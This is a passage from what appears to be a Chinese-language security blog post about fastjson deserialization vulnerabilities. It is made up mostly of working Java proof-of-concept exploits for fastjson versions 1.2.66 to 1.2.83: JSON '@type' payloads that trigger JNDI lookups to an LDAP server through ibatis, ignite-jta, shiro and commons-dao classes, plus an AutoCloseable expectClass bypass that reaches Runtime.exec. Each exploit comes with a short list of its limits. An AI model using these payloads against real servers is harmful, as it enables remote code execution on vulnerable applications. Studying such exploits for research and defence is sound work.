<h3 id="Exp-11"><a href="#Exp-11" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.ibatis&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.3.4.726&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;javax&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;8.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_c</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="限制-11"><a href="#限制-11" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要ibatis-sqlmap、javaee组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-11"><a href="#调试分析-11" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h1 id="1-2-25-1-2-67"><a href="#1-2-25-1-2-67" class="headerlink" title="1.2.25-1.2.67"></a>1.2.25-1.2.67</h1><h2 id="igniteJta链"><a href="#igniteJta链" class="headerlink" title="igniteJta链"></a>igniteJta链</h2><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>禁用黑名单绕过。</p>
<h3 id="Exp-12"><a href="#Exp-12" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.8.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_67_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/Calc\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="限制-12"><a href="#限制-12" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要ignite-jta组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-12"><a href="#调试分析-12" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h3 id="shiro链-1"><a href="#shiro链-1" class="headerlink" title="shiro链"></a>shiro链</h3><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>禁用黑名单绕过。</p>
<h3 id="Exp-13"><a href="#Exp-13" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">          &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.4&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_67_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="限制-13"><a href="#限制-13" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要shiro组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-13"><a href="#调试分析-13" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h1 id="1-2-25-1-2-68"><a href="#1-2-25-1-2-68" class="headerlink" title="1.2.25-1.2.68"></a>1.2.25-1.2.68</h1><h2 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>利用expectClass绕过AutoType，不是黑名单绕过，不需要开autoTypeSupport。</p>
<h2 id="Exp-14"><a href="#Exp-14" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;Poc.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="限制-14"><a href="#限制-14" class="headerlink" title="限制"></a>限制</h2><ul>
<li>需要在Server端有实现了AutoCloseable的类或者子类</li>
</ul>
<h2 id="调试分析-14"><a href="#调试分析-14" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p>
<h1 id="1-2-25-1-2-83"><a href="#1-2-25-1-2-83" class="headerlink" title="1.2.25-1.2.83"></a>1.2.25-1.2.83</h1><h2 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过禁用类黑名单。<br>利用springboot环境下的commons-dao组件，进行jndi注入。</p>
<h2 id="Exp-15"><a href="#Exp-15" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;parent&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.6.7&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="comment">    &lt;/parent&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.epam.reportportal&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;commons-dao&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;5.0.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_83</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.epam.ta.reportportal.config.DataSourceConfig\&quot;,\&quot;metricRegistry\&quot;: \&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="限制-15"><a href="#限制-15" class="headerlink" title="限制"></a>限制</h2><ul>
<li>需要开启autoTypeSupport</li>
<li>需要springboot环境、commons-dao组件</li>
<li>利用jndi执行命令，受JDK版本限制</li>
</ul>
<h2 id="调试分析-15"><a href="#调试分析-15" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>挠头，fastjson这么多利用，给我语雀都整卡了&#x3D; &#x3D;</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>fastjson反序列化 漏洞分析文章<br><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">1.2.48之后的利用@mi1k7ea</a><br><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/archives/">mi1k7ea师傅的fastjson漏洞分析系列  很详细适合学习</a><br><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson">su18师傅 比上一个简略</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1579/#toc_fastjson">https://tttang.com/archive/1579/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12096">https://xz.aliyun.com/t/12096</a><br><strong>关闭ASM开关，方便进行调试</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45854465/article/details/120960671">https://blog.csdn.net/qq_45854465&#x2F;article&#x2F;details&#x2F;120960671</a><br>ASM动态加载相关，如何查看内存生成的类的源码<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6974566732224528392#heading-6">https://juejin.cn/post/6974566732224528392#heading-6</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wjy160925/article/details/85288569">https://blog.csdn.net/wjy160925/article/details/85288569</a><br>toJSONString()方法的源码分析（较浅）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31615049/article/details/85013129">https://blog.csdn.net/qq_31615049&#x2F;article&#x2F;details&#x2F;85013129</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
        
          <li><a href="/links/">links</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E8%B0%83getter"><span class="toc-number">2.1.</span> <span class="toc-text">为什么会调getter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0JSON%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">2.2.</span> <span class="toc-text">构造JSON字符串的地方</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A0%B9%E6%8D%AEJSON%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%81%E8%A3%85deserializer"><span class="toc-number">3.1.</span> <span class="toc-text">1.根据JSON字符串封装deserializer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%B0%83%E7%94%A8deserializer-deserialize%E5%88%9B%E5%BB%BA%E5%B9%B6%E5%88%9D%E5%A7%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2.调用deserializer#deserialize创建并初始化对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parse%E5%92%8CparseObject%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.3.</span> <span class="toc-text">parse和parseObject的区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-22-1-2-24"><span class="toc-number">4.</span> <span class="toc-text">1.2.22-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatsImpl%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text">TemplatsImpl链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9"><span class="toc-number">4.1.2.</span> <span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8A%A0-type%E6%8C%87%E5%AE%9A%E5%85%A8%E7%B1%BB%E5%90%8D"><span class="toc-number">4.1.3.</span> <span class="toc-text">为什么加@type指定全类名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88parse%E8%A6%81%E5%8A%A0Feature%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.4.</span> <span class="toc-text">为什么parse要加Feature参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-bytecodes%E8%A6%81base64%E7%BC%96%E7%A0%81"><span class="toc-number">4.1.5.</span> <span class="toc-text">为什么_bytecodes要base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E8%A7%A6%E5%8F%91getOutputProperties"><span class="toc-number">4.1.6.</span> <span class="toc-text">为什么会触发getOutputProperties</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl%E9%93%BE"><span class="toc-number">4.2.</span> <span class="toc-text">JdbcRowSetImpl链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">4.2.3.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AFDataSourceName%E8%80%8C%E4%B8%8D%E6%98%AFdataSource"><span class="toc-number">4.2.4.</span> <span class="toc-text">为什么是DataSourceName而不是dataSource</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-41"><span class="toc-number">5.</span> <span class="toc-text">1.2.25-1.2.41</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">5.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">5.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">5.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">5.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-42"><span class="toc-number">6.</span> <span class="toc-text">1.2.25-1.2.42</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-1"><span class="toc-number">6.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-1"><span class="toc-number">6.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-1"><span class="toc-number">6.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1"><span class="toc-number">6.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-43"><span class="toc-number">7.</span> <span class="toc-text">1.2.25-1.2.43</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-2"><span class="toc-number">7.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-2"><span class="toc-number">7.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-2"><span class="toc-number">7.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-2"><span class="toc-number">7.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-45"><span class="toc-number">8.</span> <span class="toc-text">1.2.25-1.2.45</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-3"><span class="toc-number">8.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-3"><span class="toc-number">8.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-3"><span class="toc-number">8.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-3"><span class="toc-number">8.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-47"><span class="toc-number">9.</span> <span class="toc-text">1.2.25-1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-4"><span class="toc-number">9.1.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-4"><span class="toc-number">9.2.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-4"><span class="toc-number">9.3.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-59"><span class="toc-number">10.</span> <span class="toc-text">1.2.25-1.2.59</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-5"><span class="toc-number">10.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-5"><span class="toc-number">10.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-5"><span class="toc-number">10.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-61%EF%BC%88%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">1.2.25-1.2.61（复现失败）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">11.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-6"><span class="toc-number">11.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-6"><span class="toc-number">11.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 